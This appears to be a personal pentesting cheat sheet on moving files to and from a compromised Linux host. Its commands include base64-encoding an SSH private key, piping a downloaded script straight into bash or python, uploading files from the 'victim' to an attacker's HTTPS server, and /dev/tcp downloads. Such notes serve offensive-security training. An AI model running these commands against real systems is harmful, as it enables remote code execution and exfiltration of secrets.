```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```
## Base64 Encode / Decode
Make sure to check the hash on both sides
```bash
# 1. Get the hash
md5sum id_rsa

# 2. Encode it (-w 0; echo, means its one line and easier to copy)
cat id_rsa | base64 -w 0; echo

# 3. [On victim] Decode it
echo -n '<paste>' | base64 -d > id_rsa

# 4. [On victim] Check hash
md5sum id_rsa
```

## Web Downloads
```bash
wget '<URL>' -O '<OutFile location>'

curl -o '<OutFile location>' '<URL>'
```

### Fileless Download
```bash
wget -qO- '<URL>' | python3

curl '<URL>' | bash
```

## Web Uploads
### Python uploadserver pkg
```bash
# 1. Install uploadserver python package
sudo python3 -m pip install --user uploadserver

# 2. [For HTTPS] Create server self-signed cert 
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# 3. Start the server
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

# 4. [On Victim] Upload files to our server (can have multiple -F's for multi-file)
curl -X POST https://<ip>/upload -F 'files=@/<file path>' --insecure
```
### Other webservers
We can stand up a simple webserver on the victim machine and then download (`curl` / `wget`) the files onto our machine:
```bash
# Python3
python3 -m http.server

# Python2.7
python2.7 -m SimpleHTTPServer

# PHP
php -S 0.0.0.0:8000

# Ruby
ruby -run -ehttpd . -p8000
```

## Download with Bash (/dev/tcp)
Sometimes traditional methods don't work, if bash is v2.04+ & compiled with `--enable-net-redirects`, we can use the built-in `/dev/TCP` device file to download files.
```bash
# 1. Connect to the target webserver
exec 3<>/dev/tcp/<ip>/<port>

# 2. Get Request
echo -e "GET /<path> HTTP/1.1\n\n">&3

# 3. Print Response
cat <&3
```

## SSH Downloads
We can use `scp` to copy from one machine to another using SSH. We might need to setup an SSH server on our local machine:
```bash
sudo systemctl enable ssh
sudo systemctl start ssh

# Check for listening port (22)
netstat -lnpt | grep ":22"

# Use SCP
scp '<user>@<ip>:<file path>' '<local file path>'
```